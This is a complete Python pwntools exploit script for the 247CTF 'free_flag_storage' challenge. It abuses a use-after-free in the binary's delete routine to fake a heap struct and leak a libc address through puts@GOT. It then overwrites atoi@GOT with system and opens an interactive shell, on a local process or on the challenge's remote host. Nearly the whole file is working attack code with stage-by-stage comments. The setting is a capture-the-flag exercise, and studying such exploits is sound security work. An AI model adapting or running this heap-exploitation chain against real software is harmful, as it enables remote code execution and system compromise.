#!/usr/bin/env python3
"""
UAF Exploit for free_flag_storage - 247CTF

Vulnerability: Use-After-Free in delete() - frees memory but doesn't NULL the pointer
Exploit: Heap feng shui to create fake struct, leak libc, overwrite atoi@GOT with system

The program writes a NULL byte at value_ptr + bytes_read - 1
Use length=5 instead of length=4 to avoid corrupting the MSB of system address
"""
from pwn import *

context.binary = ELF("./free_flag_storage", checksec=False)
context.log_level = "info"

# GOT addresses (No PIE)
puts_got = 0x804B028
atoi_got = 0x804B034

# Libc offsets - Ubuntu 18.04 i386 (remote)
REMOTE_PUTS = 0x67360
REMOTE_SYSTEM = 0x3CD10

# Local libc
local_libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)


def start():
    if args.REMOTE:
        return remote("de22d451a7a11cba.247ctf.com", 50413)
    return process("./free_flag_storage")


p = start()


def send3(s):
    """Send value padded to 3 bytes (program reads 3 bytes for numbers)"""
    p.send(str(s).encode().ljust(3, b"\n"))


def add(length, value, cid, score):
    p.sendline(b"add")
    p.recvuntil(b"length:")
    send3(length)
    p.recvuntil(b"value:")
    p.send(value.ljust(length, b"\x00")[:length])
    p.recvuntil(b"challenge_id:")
    send3(cid)
    p.recvuntil(b"score:")
    send3(score)
    p.recvuntil(b"Enter command:")


def edit(idx, value, length, cid=99, score=99):
    p.sendline(b"edit")
    p.recvuntil(b"edit:")
    send3(idx)
    p.recvuntil(b"):")
    p.send(value.ljust(length, b"\x00")[:length])
    p.recvuntil(b"challenge_id:")
    send3(cid)
    p.recvuntil(b"score:")
    send3(score)
    p.recvuntil(b"Enter command:")


def delete(idx):
    p.sendline(b"delete")
    p.recvuntil(b"delete:")
    send3(idx)
    p.recvuntil(b"Enter command:")


def show():
    p.sendline(b"print")
    return p.recvuntil(b"Enter command:", drop=True)


# ============================================================
# STAGE 1: Setup heap overlap via UAF
# ============================================================
log.info("Stage 1: Creating heap overlap")
p.recvuntil(b"Enter command:")

# Create 3 flags with 8-byte values
# struct (16 bytes) -> 24-byte chunk
# value (8 bytes)   -> 16-byte chunk (different fastbin!)
add(8, b"AAAAAAAA", 1, 11)  # flag0: struct0, value0
add(8, b"BBBBBBBB", 2, 22)  # flag1: struct1, value1
add(8, b"CCCCCCCC", 3, 33)  # flag2: struct2, value2

# Delete flag0 and flag1
# After delete: flags[0] and flags[1] are dangling pointers
# fastbin-24: struct1 -> struct0
# fastbin-16: value1 -> value0
delete(0)
delete(1)

# Add new flag with 16-byte value (24-byte chunk, same as struct!)
# malloc(struct) gets struct1 from fastbin-24
# malloc(value)  gets struct0 from fastbin-24 (!)
# So: value3 = struct0 location, and flags[0] still points to struct0!
# We write our fake struct as the value, which ends up at struct0 location

# CRITICAL: Use length=5 instead of 4!
# The program writes NULL at value_ptr + bytes_read - 1
# With length=4, NULL overwrites MSB of our address
# With length=5, NULL writes to GOT+4 which doesn't corrupt our 4-byte address
fake_struct_leak = p32(5) + p32(puts_got) + p32(0xCAFE) + p32(0xBABE)
add(16, fake_struct_leak, 4, 44)

# ============================================================
# STAGE 2: Leak libc via fake struct
# ============================================================
log.info("Stage 2: Leaking libc address")
data = show()

# flags[0] (dangling) -> struct0 = our fake struct
# fake_struct.value_ptr = puts@GOT -> prints puts@libc
puts_libc = None
for line in data.split(b"\n"):
    if b"51966" in line:  # 0xcafe = 51966 (our marker)
        content = line[line.find(b"{") + 1 : line.find(b"}")]
        puts_libc = u32(content[:4])
        log.success(f"Leaked puts@libc: {hex(puts_libc)}")
        break

if not puts_libc:
    log.error("Leak failed!")
    p.close()
    exit(1)

# Calculate addresses
if args.REMOTE:
    libc_base = puts_libc - REMOTE_PUTS
    system_addr = libc_base + REMOTE_SYSTEM
else:
    libc_base = puts_libc - local_libc.symbols["puts"]
    system_addr = libc_base + local_libc.symbols["system"]

log.info(f"libc base: {hex(libc_base)}")
log.info(f"system:    {hex(system_addr)}")

# ============================================================
# STAGE 3: Update fake struct to point to atoi@GOT
# ============================================================
log.info("Stage 3: Redirecting fake struct to atoi@GOT")

# edit(1) writes to flags[1]->value_ptr = value3 = struct0 = our fake struct
# So we can update the fake struct to point to atoi@GOT
fake_struct_atoi = p32(5) + p32(atoi_got) + p32(0xDEAD) + p32(0xBEEF)
edit(1, fake_struct_atoi, 16)

# ============================================================
# STAGE 4: Overwrite atoi@GOT with system
# ============================================================
log.info("Stage 4: Overwriting atoi@GOT with system")

# edit(0) reads flags[0] = our updated fake struct
# fake_struct.value_ptr = atoi@GOT
# Writes our data to atoi@GOT
p.sendline(b"edit")
p.recvuntil(b"edit:")
send3(0)
p.recvuntil(b"):")

# Send 5 bytes: 4 bytes of system address + 1 dummy byte
# The NULL will be written at atoi@GOT + 4, not atoi@GOT + 3
p.send(p32(system_addr) + b"X")

# ============================================================
# STAGE 5: Trigger shell
# ============================================================
p.recvuntil(b"challenge_id:")
log.success("atoi@GOT overwritten! Sending 'sh' to trigger system()")

# The program calls atoi(input) which is now system(input)
# Sending "sh" will execute system("sh")
p.sendline(b"sh")

log.success("Shell ready!")
p.interactive()
